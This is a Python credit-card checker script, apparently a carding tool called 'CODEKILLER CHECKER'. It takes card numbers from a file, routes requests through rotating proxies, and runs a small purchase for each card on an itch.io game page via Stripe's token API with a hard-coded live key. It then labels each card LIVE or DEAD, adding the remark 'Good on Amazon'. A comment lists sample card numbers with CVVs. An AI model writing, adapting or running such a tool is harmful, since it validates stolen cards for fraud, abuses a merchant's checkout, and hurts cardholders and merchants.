# -*- coding: utf-8 -*-
from bs4 import BeautifulSoup
from itertools import cycle
import requests
import json
import threading
import colorama



colorama.init(autoreset=True)
reset = '\033[0m'
fg = [
    '\033[1;91m',  # RED
    '\033[1;92m',  # GREEN
    '\033[1;93m',  # YELLOW
    '\033[1;94m',  # BLUE
    '\033[1;95m',  # MAGENTA
    '\033[1;96m',  # CYAN
    '\033[1;97m',  # WHITE
]

'''  ┌───────[ 4447962400608711|06|2021|272 ]──(52)
     └────────── DEAD >>> Reason: Your card's security code is incorrect.
┌───────[ 4447962400608109|06|2021|517 ]──(55)
└────────── DEAD >>> Reason: Your card's security code is incorrect.

┌───────[ 4447962400604579|06|2021|063 ]──(101)
└────────── DEAD >>> Reason: Your card's security code is incorrect.
     '''


class StripeChecker():

    def __init__(self):
        self.main_domain = "https://puppetcombo.itch.io/nun-massacre"
        self.purchase = "https://puppetcombo.itch.io/nun-massacre/purchase"
        self.stripe_tokens = "https://api.stripe.com/v1/tokens"

        print("\n\n  {}------=[ {}CODEKILLER CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
        print("      {}--= {}Created by Codekiller {}=--          ".format(fg[0], fg[1], fg[0]))
        print("  {}------========================------\n".format(fg[0]))
        self.check()

    def check(self):
        proxy_lists = []
        cc_list = open('cc.txt', 'r').read()
        cc_list = cc_list.split('\n')
        credit_entry = 0
        # threads = []

        with open('proxies.txt', 'r') as proxy_list:
            proxy = proxy_list.read()
            proxy = proxy.split('\n')
            for x in proxy:
                proxy_lists.append(x)

        proxy_pool = cycle(proxy_lists)
        Username = str(input(fg[2] + '[*]' + reset + ' Enter Full Name: '))
        zipcode = str(input(fg[2] + '[*]' + reset + "Enter CC's ZipCode: "))
        proxyused = str(input(fg[5] + '[?]' + reset + ' Use Proxy?[y/n] '))
        isproxyused = False

        if proxyused.lower() == "y":
            isAuth = str(input(fg[5] + "[?]" + reset + " Proxy is Authenticated?[y/n] "))
        else:
            isAuth = 'n'

        auth = False

        if isAuth.lower() == "y":
            auth = True
            username = str(input(fg[2] + '[*]' + reset + ' Username: '))
            password = str(input(fg[2] + '[*]' + reset + ' Password: '))
        else:
            username = ""
            password = ""

        print(fg[3] + "[*]" + reset + " Start Checking of " + str(len(cc_list)) + " Credit Card.")
        print()
        for credit_card in cc_list:
            session = requests.Session()
            credit_entry += 1
            if isproxyused:
                proxy_to_use = next(proxy_pool)

            session = requests.Session()
            # session, Username, credit_card, credit_entry,
            # proxy, username, password, isAuth=False

            try:
                ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
            except ValueError:
                pass

            if isproxyused:
                if isAuth:
                    proxy = {'https': "http://" + username + ':' + password + '@' + proxy}
                else:
                    proxy = {'https': 'http://' + proxy}
            else:
                proxy = {'': ''}

            main_domain_source = BeautifulSoup(session.get(self.main_domain, proxies=proxy).text, 'html.parser')
            csrf = main_domain_source.find('meta', {'name': 'csrf_token'})['value']

            purchase_data = {
                "csrf_token": csrf,
                "source": "stripe",
                "medium": "default",
                "initiator": "game",
                "bp": "1352c97c578a5257f528baee67eecf68",
                "price": "$4.95",
                "email": "ckknocktoyou@gmail.com",
                "json": "true"
            }
            purchase_response = json.loads(session.post(self.purchase, data=purchase_data, proxies=proxy).text)
            try:
                checkout_url = purchase_response['url']
            except KeyError:
                print(fg[0] + "[x]" + reset + " Connection Error.")
                return

            checkout_data = {
                'card[name]': Username,
                'card[number]': ccNum,
                'card[cvc]': ccCode,
                'card[exp_month]': ccMonth,
                'card[exp_year]': ccYear,
                'card[address_zip]': zipcode,
                'guid': '7745e9e2-dd6a-4714-8611-2b58a9058a31',
                'muid': 'ceacade8-663f-48b9-a305-f6b0be7fac82',
                'sid': 'c6b55fc7-daaf-4219-888b-0af38a4d3f6b',
                'payment_user_agent': 'stripe.js/e7e4d3cf; stripe-js-v3/e7e4d3cf',
                'referrer': checkout_url,
                'key': 'pk_live_YpSNu1qXLz2bvSUqP7TK7P9U',
                'pasted_fields': 'number'
            }

            checkout_response = json.loads(session.post(self.stripe_tokens, proxies=proxy, data=checkout_data).text)
            tok_id = checkout_response['id']

            result_data = {
                "csrf_token": csrf,
                "card_token": tok_id,
                "bp": "1352c97c578a5257f528baee67eecf68",
                "email": "ckknocktoyou@gmail.com",
                "name": Username
            }
            result_response = session.post(checkout_url, proxies=proxy, data=result_data).text
            print()
            try:
                error = BeautifulSoup(result_response, 'html.parser')
                error_msg = error.find('div', {'class': 'form_errors'}).get_text()

                if error_msg == "Your card's security code is incorrect.":
                    print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                    print(fg[1] + "└────────── LIVE! ~> But Incorrect CVV (Good on Amazon)")

                else:
                    print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                    print(fg[0] + "└────────── " + reset + "DEAD >>> Reason: " + str(error_msg))

            except Exception as e:
                print(e)
                print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                print(fg[1] + "└────────── LIVE!")
        print()
        print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
        print()

StripeChecker()
